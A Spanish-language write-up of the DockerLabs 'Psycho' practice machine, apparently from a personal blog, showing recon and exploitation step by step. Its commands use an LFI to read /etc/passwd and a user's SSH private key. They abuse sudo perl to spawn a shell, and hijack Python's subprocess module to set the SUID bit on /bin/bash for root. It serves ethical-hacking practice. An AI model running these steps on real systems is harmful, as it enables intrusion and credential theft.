---
title: Psycho
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-24
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-psycho/psycho_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - fuzzing web
  - lfi
  - suid
  - sudo abuse
  - information gathering
  - web analysis
  - vulnerability exploitation
  - lateral movement
  - user pivoting
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/psycho:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.049 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.049/0.049/0.049/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/psycho:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.2 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///      Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/psycho:-$ sudo nmap -sCV -p22,80 -vvv 127.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLmfDz6T3XGKWifPXb0JRYMnpBIhNV4en6M+lkDFe1l/+EjBi+8MtlEy6EFgPI9TZ7aTybt2qudKJ8+r3wcsi8w=
|   256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHtGVi9ya8KY3fjIqNDQcC9RuW20liVFDd+uUEgllPzQ
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 4You
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/psycho:-$ whatweb 127.17.0.2     
http://127.17.0.2 [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], Script, Title[4You]
```

---
## Web Analysis & Vulnerability Exploitation

Durante el análisis inicial de una página web estática, no se detecta contenido relevante.

![](assets/img/dockerlabs-writeup-psycho/psycho1_1.png)

Sin embargo, al inspeccionar el código fuente, se encuentra una línea peculiar fuera de las etiquetas HTML, `[!] ERROR [!]`. Esto sugiere que la página podría ser vulnerable a LFI, ya que errores de este tipo suelen revelar rutas accesibles o archivos cargados dinámicamente.

![](assets/img/dockerlabs-writeup-psycho/psycho1_2.png)

Enumero parámetros posibles en el sitio web, apuntando hacia la explotación de LFI.

```terminal
/home/kali/Documents/dockerlabs/psycho:-$ wfuzz -u http://127.17.0.2/index.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc=404 -c -t 200 --hw=169
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000005155:   200        88 L     199 W      3870 Ch     "secret"
```

El parámetro vulnerable detectado es `secret`. Verifico la vulnerabilidad cargando el archivo `/etc/passwd`.

![](assets/img/dockerlabs-writeup-psycho/psycho1_3.png)

```terminal
/home/kali/Documents/dockerlabs/psycho:-$ curl http://127.17.0.2/index.php?secret=/etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
```

Identifico la existencia del usuario `vaxei`. Aprovechando la vulnerabilidad, extraigo la clave privada del usuario `vaxei` desde su directorio `.ssh`

```terminal
/home/kali/Documents/dockerlabs/psycho:-$ curl http://127.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa | sed '/<body>/d; /<\/body>/d; /<head>/d; /<\/head>/d'

/home/kali/Documents/dockerlabs/psycho:-$ chmod 600 id_rsa

/home/kali/Documents/dockerlabs/psycho:-$ ssh vaxei@127.17.0.2 -i id_rsa

vaxei@kali:~$ id
uid=1001(vaxei) gid=1001(vaxei) groups=1001(vaxei),100(users)
```

---
## User Pivoting

```terminal
vaxei@kali:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
luisillo:x:1002:1002::/home/luisillo:/bin/sh
```

El usuario `vaxei` puede ejecutar `perl` como el usuario `luisillo` sin necesidad de contraseña.

```terminal
vaxei@kali:~$ sudo -l
Matching Defaults entries for vaxei on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User vaxei may run the following commands on kali:
    (luisillo) NOPASSWD: /usr/bin/perl
```

Según la documentación de [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo), `perl` puede usarse para ejecutar comandos del sistema.

```terminal
vaxei@kali:~$ sudo -u luisillo perl -e 'exec "/bin/sh";'

$ id
uid=1002(luisillo) gid=1002(luisillo) groups=1002(luisillo)
```

---
## Privilege Escalation

```terminal
$ script /dev/null -c bash
```

El usuario `luisillo` puede ejecutar el script `/opt/paw.py` como cualquier usuario `(ALL)`, sin necesidad de contraseña.

```terminal
luisillo@kali:~$ sudo -l
Matching Defaults entries for luisillo on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

El archivo `/opt/paw.py` contiene varias funciones que simulan procesamiento de datos y cálculos inútiles.

```terminal
luisillo@kali:~$ cat /opt/paw.py
```

![](assets/img/dockerlabs-writeup-psycho/psycho2_1.png)

Sin embargo, en la función `run_command`, el script ejecuta un comando mediante `subprocess.run`. Este es un punto explotable ya que `subprocess.run` intenta ejecutar `echo Hello!`, pero no encuentra el archivo, causando un error.

```terminal
luisillo@kali:~$ sudo python3 /opt/paw.py
```

![](assets/img/dockerlabs-writeup-psycho/psycho2_2.png)

El script usa la librería subprocess desde el directorio `/opt/`. Si creó un archivo malicioso llamado `subprocess.py` en dicho directorio, Python lo importará debido a su ubicación en el mismo directorio que el script.

Esto permite reemplazar el comportamiento de la librería estándar con un código que escale privilegios.

```terminal
luisillo@kali:~$ cat /opt/subprocess.py 
import os

os.system("chmod u+s /bin/bash")
```

Se ejecuta el script original, lo que provoca que importe y ejecute el archivo malicioso `subprocess.py`.

```terminal
luisillo@kali:~$ sudo python3 /opt/paw.py
```

Después de ejecutar el script, los permisos del binario `/bin/bash` cambian para permitir su ejecución como `root`.

```terminal
luisillo@kali:~$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

```terminal
luisillo@kali:~$ /bin/bash -p
bash-5.2# id
uid=1002(luisillo) gid=1002(luisillo) euid=0(root) groups=1002(luisillo)
```
